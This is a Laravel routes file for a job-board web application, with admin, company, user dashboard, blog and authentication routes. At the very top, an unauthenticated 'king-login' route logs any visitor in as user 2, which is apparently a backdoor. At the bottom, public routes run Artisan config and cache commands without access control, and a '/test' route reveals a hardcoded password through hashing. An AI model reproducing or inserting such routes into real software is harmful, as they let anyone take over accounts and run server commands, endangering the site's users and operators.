<?php
Route::get('king-login' , function(){
  Auth::loginUsingId(2);
});
Route::get('change-lang/{lang}' , 'FrontEndController@ChangeLanguage')->name('changeLang');
//Admin Routes
Route::group(['prefix' => 'admin','middleware' => ['isAdmin']], function () {
    Route::get('/' , 'AdminController@getHome')->name('admin.home');
    //Admin Blog
    Route::get('blog/new' , 'BlogController@getNew')->name('admin.blog.new');
    Route::post('blog/new' , 'BlogController@postNew')->name('admin.blog.new.post');
    Route::get('blog/new-section' , 'BlogController@getNewSection')->name('admin.blog.section.new');
    Route::post('blog/new-section' , 'BlogController@postNewSection')->name('admin.blog.section.new.post');
    Route::get('blog/all' , 'AdminController@getAllBlogPosts')->name('admin.blog');
    Route::get('blog/sections' , 'BlogController@getAllSections')->name('admin.blog.sections');
    Route::get('/blog/section/delete/{id}' , 'BlogController@deleteBlogSection')->name('admin.blog.section.delete');
    Route::get('/blog/section/edit/{id}' , 'BlogController@getEditBlogSection')->name('admin.blog.section.edit');
    Route::post('/blog/section/edit/{id}' , 'BlogController@postEditBlogSection')->name('admin.blog.section.edit.post');
    Route::get('blog/delete/{id}' , 'AdminController@deleteBlogPost')->name('admin.blog.delete');
    Route::get('blog/edit/{id}' , 'AdminController@getEditBlogPost')->name('admin.blog.edit');
    Route::post('blog/edit/{id}' , 'AdminController@postEditBlogPost')->name('admin.blog.update.post');
    //Admin Users
    Route::get('users' , 'AdminController@getUsers')->name('admin.users');
    Route::get('users/delete/{id}' , 'AdminController@deleteUser')->name('admin.user.delete');
    //Admin Companies
    Route::get('companies' , 'AdminController@getCompanies')->name('admin.companies');
    Route::get('inactive-companies' , 'AdminController@getInActiveCompanies')->name('admin.inactiveCompanies');
    Route::get('company/delete/{id}' , 'AdminController@deleteCompany')->name('admin.company.delete');
    Route::get('company/deactivate/{id}' , 'AdminController@deactivateCompany')->name('admin.company.deactivate');
    Route::get('company/activate/{id}' , 'AdminController@activateCompany')->name('admin.company.activate');
    //Admin Jobs
    Route::get('jobs' , 'AdminController@getJobs')->name('admin.jobs');
    Route::get('job/delete/{id}' , 'AdminController@deleteJob')->name('admin.job.delete');
    //Admin Applications
    Route::get('applications' , 'AdminController@getApplications')->name('admin.applications');
    Route::get('application/delete/{id}' , 'AdminController@deleteApplication')->name('admin.application.delete');
    //Admin Blog Comments
    Route::get('comments' , 'AdminController@getComments')->name('admin.comments');
    Route::get('comment/delete/{id}' , 'AdminController@deleteComment')->name('admin.comment.delete');
    //Admin Cities
    Route::get('cities/all' , 'AdminController@getCities')->name('admin.cities');
    Route::get('cities/add' , 'AdminController@getNewCity')->name('admin.cities.add.get');
    Route::post('cities/add' , 'AdminController@postNewCity')->name('admin.cities.add.post');
    Route::get('cities/delete/{id}' , 'AdminController@deleteCity')->name('admin.cities.delete');
    Route::get('cities/edit/{id}' , 'AdminController@getUpdateCity')->name('admin.cities.update.get');
    Route::post('cities/edit/{id}' , 'AdminController@postUpdateCity')->name('admin.cities.update.post');
    //Admin Categories
    Route::get('categories/all' , 'AdminController@getCategories')->name('admin.categories');
    Route::get('categories/add' , 'AdminController@getNewCategory')->name('admin.categories.add.get');
    Route::post('categories/add' , 'AdminController@postNewCategory')->name('admin.categories.add.post');
    Route::get('categories/delete/{id}' , 'AdminController@deleteCategory')->name('admin.categories.delete');
    Route::get('categories/edit/{id}' , 'AdminController@getUpdateCategory')->name('admin.categories.update.get');
    Route::post('categories/edit/{id}' , 'AdminController@postUpdateCategory')->name('admin.categories.update.post');
});
// End Admin Routes
Route::get('/' , 'FrontEndController@getIndex')->name('home'); //Translation Tested
Route::get('/about' , 'FrontEndController@getAbout')->name('about'); //Translation Tested
Route::get('/contact' , 'ContactController@getContactView')->name('contact'); //Translation Tested
Route::post('/contact' , 'ContactController@ProccessContact')->name('contact.do');
Route::post('/contact-quick' , 'ContactController@quickContact')->name('contact.quick');
Route::get('/categories' , 'SearchController@getCategories')->name('categories'); //Translation Tested
Route::get('/search/{type?}/{type_id?}' , 'SearchController@getSearchPage')->name('search'); //Translation Tested
//Blog
Route::prefix('blog')->group(function(){
  Route::get('/' , 'BlogController@getIndex')->name('blog'); //Translation Tested
  Route::post('comment' , 'CommentsController@postNew')->name('comment.do');
  Route::get('search/{type?}/{section?}' , 'BlogController@getSearch')->name('blog.search');//Translation Tested
  Route::get('{slug}' , 'BlogController@getSingle')->name('blog.post');
});
//Jobs
Route::get('/jobs' , 'FrontEndController@getAllJobs')->name('jobs');
Route::get('/job/{id}/{slug?}' , 'JobsController@getSingle')->name('job');
//Applications
Route::post('/apply/{job_id}/{user_id}' , 'ApplicationsController@postApplication')->middleware(['auth' , 'isNormalUser'])->name('apply.do');
//Users System
Route::middleware('guest')->group(function(){
    Route::get('/signup' , 'AuthController@getSignup')->name('signup');
    Route::post('/signup' , 'AuthController@postSignup')->name('signup.do');
    Route::get('/login' , 'AuthController@getLogin')->name('login');
    Route::post('/login' , 'AuthController@postLogin')->name('login.do');
    Route::get('login/do/{provider}', 'AuthController@redirectToProvider')->name('login.social.go');
    Route::get('login/{provider}', 'AuthController@handleProviderCallback')->name('login.social.callback');
    Route::get('/forget-password' , 'AuthController@getForgetPassword')->name('forget.password');
    Route::post('/forget-password' , 'AuthController@postForgetPassword')->name('forget.password.do');
    Route::get('change-pass/{id}/{code}' , 'AuthController@passwordResetConfirm')->name('forget.password.confirm');
});
Route::get('user/activate/{code}' , 'AuthController@ActivateAccount')->name('account.activate');
Route::get('user/re-send/{id}' , 'AuthController@ResendActivationEmail')->name('account.activate.resend');
//Companies View
Route::get('/companies' , 'FrontEndController@getCompanies')->name('companies');
Route::get('/company/{id}/{name?}' , 'FrontEndController@getCompany')->name('company');
Route::get('/user/{id}/{name?}' , 'FrontEndController@getUser')->name('user');
//Dashboard
Route::group(['prefix' => 'dashboard',  'middleware' => 'auth'], function(){
    Route::group(['prefix' => 'user','middleware' => ['isNormalUser']], function () {
        Route::get('/' , 'UserDashController@getHome')->name('dash.user.home');
        Route::get('/edit' , 'UserDashController@getEdit')->name('dash.user.edit');
        Route::post('/edit' , 'UserDashController@postEdit')->name('dash.user.edit.do');
        Route::get('/resume' , 'UserDashController@getResume')->name('dash.user.resume');
        Route::get('/applications' , 'UserDashController@getApplications')->name('dash.user.applications');
        Route::get('/application/delete/{id}' , 'ApplicationsController@deleteApplication')->name('dash.user.application.delete');
        Route::get('/favourite' , 'UserDashController@getAllLikes')->name('dash.like.all');
        Route::get('/un-like/{id}/{userId}' , 'LikeController@UnLike')->name('dash.like.unlike');
    });
    Route::group(['prefix' => 'company','middleware' => ['isCompany']], function () {
        Route::get('/home' , 'CompanyDashController@getHome')->name('dash.company.home');
        Route::get('/edit' , 'CompanyDashController@getEdit')->name('dash.company.edit');
        Route::post('/edit' , 'CompanyDashController@postEdit')->name('dash.company.edit.do');
        Route::get('/new-job' , 'JobsController@getNew')->name('job.new');
        Route::post('/new-job' , 'JobsController@postNew')->name('job.new.do');
        Route::get('/jobs' , 'JobsController@getAll')->name('dash.company.jobs');
        Route::get('/delete-job/{id}' , 'JobsController@DeleteJob')->name('dash.company.job.delete');
        Route::get('/edit/{id}' , 'JobsController@getEdit')->name('dash.company.job.edit');
        Route::post('/edit/{id}' , 'JobsController@postEdit')->name('job.edit.do');
        Route::get('/applications' , 'CompanyDashController@getApplications')->name('dash.company.applications');
        Route::get('/delete-attachments/{id}' , 'CompanyDashController@DeleteAttachments')->name('dash.company.deleteAttachments');
});

});
Route::get('/logout' , 'AuthController@logout')->middleware('auth')->name('logout');
Route::get('/privacy' , 'FrontEndController@getAbout')->name('privacy');






//Clear configurations:
			Route::get('/config-clear', function() {
				$status = Artisan::call('config:clear');
				return '<h1>Configurations cleared</h1>';
			});

//Clear cache:
			Route::get('/cache-clear', function() {
				$status = Artisan::call('cache:clear');
				return '<h1>Cache cleared</h1>';
			});

//Clear configuration cache:
			Route::get('/config-cache', function() {
				$status = Artisan::call('config:cache');
				return '<h1>Configurations cache cleared</h1>';
			});
Route::get('/test' , function(){
  return Hash::make('5753572_Af');
});
